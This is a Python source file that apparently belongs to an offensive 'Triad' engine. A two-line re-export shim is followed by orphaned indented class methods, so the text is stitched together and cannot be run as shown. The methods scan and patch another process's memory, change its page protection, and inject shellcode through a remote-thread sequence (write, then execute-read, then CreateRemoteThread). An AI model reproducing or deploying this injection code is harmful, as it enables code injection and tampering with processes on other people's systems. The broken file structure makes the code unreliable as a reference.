"""Compatibility shim: re-export new vx_eng symbols for backward imports."""

from .vx_eng import *  # noqa: F401,F403

        if len(target) != len(replacement):
            raise TriadMemoryError("target and replacement must be same length")

        regions = self._iterate_memory_regions_sync(hproc)

        regions_scanned = 0

        for base, size, protect, state in regions:
            regions_scanned += 1
            # skip non-readable regions
            if protect & int(WinProtect.NOACCESS):
                continue

            # read in chunks
            offset = 0
            chunk_size = 0x1000
            while offset < size:
                to_read = min(chunk_size, size - offset)
                addr = int(base) + offset
                try:
                    data = self._read_memory_sync(hproc, addr, to_read)
                except TriadMemoryError:
                    offset += to_read
                    continue

                idx = data.find(target)
                if idx != -1:
                    found_addr = addr + idx
                    # write replacement
                    self._write_memory_sync(hproc, found_addr, replacement)
                    return found_addr, regions_scanned

                offset += to_read

        raise TriadMemoryError(f"pattern not found in process memory (regions_scanned={len(regions)})")

    async def protect_memory(
        self, hproc: wintypes.HANDLE, addr: int, size: int, new_protect: int
    ) -> int:
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(
            None, self._protect_memory_sync, hproc, addr, size, new_protect
        )

    def _protect_memory_sync(
        self, hproc: wintypes.HANDLE, addr: int, size: int, new_protect: int
    ) -> int:
        old_protect = wintypes.DWORD(0)

        res = self.VirtualProtectEx(
            hproc, addr, size, int(new_protect), ctypes.byref(old_protect)
        )
        if not res:
            error_code = ctypes.get_last_error()
            raise TriadMemoryError("VirtualProtectEx failed", error_code=error_code)

        return old_protect.value

    async def create_remote_thread(
        self, hproc: wintypes.HANDLE, entry_point: int
    ) -> wintypes.HANDLE:
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(
            None, self._create_remote_thread_sync, hproc, entry_point
        )

    def _create_remote_thread_sync(
        self, hproc: wintypes.HANDLE, entry_point: int
    ) -> wintypes.HANDLE:
        hthread = self.CreateRemoteThread(hproc, None, 0, entry_point, None, 0, None)
        if not hthread:
            error_code = ctypes.get_last_error()
            raise TriadProcessError("CreateRemoteThread failed", error_code=error_code)

        return hthread

    async def inject_memory(self, pid: int, payload: bytes) -> Dict[str, Any]:
        """Inject shellcode using RW -> Write -> RX sequence with robust cleanup."""
        hproc: Optional[wintypes.HANDLE] = None
        hthread: Optional[wintypes.HANDLE] = None
        addr: Optional[int] = None

        try:
            hproc = await self.open_process(pid)

            addr = await self.allocate_memory(hproc, len(payload))

            await self.write_memory(hproc, addr, payload)

            old_protect = await self.protect_memory(
                hproc, addr, len(payload), WinProtect.EXECUTE_READ
            )

            hthread = await self.create_remote_thread(hproc, addr)

            return {
                "success": True,
                "pid": pid,
                "injection_addr": hex(addr) if addr else None,
                "payload_size": len(payload),
                "old_protection": hex(old_protect) if old_protect else None,
                "thread_handle": int(hthread) if hthread else None,
            }

        except TriadEngineError as e:
            return {
                "success": False,
                "pid": pid,
                "error": str(e),
                "error_type": type(e).__name__,
            }

        finally:
            if hthread:
                try:
                    self.token_mgr.close_handle(hthread)
                except TriadEngineError:
                    pass

            if hproc:
                try:
                    self.token_mgr.close_handle(hproc)
                except TriadEngineError:
                    pass

    def cleanup(self) -> None:
        """Cleanup de recursos si aplica."""
        return None
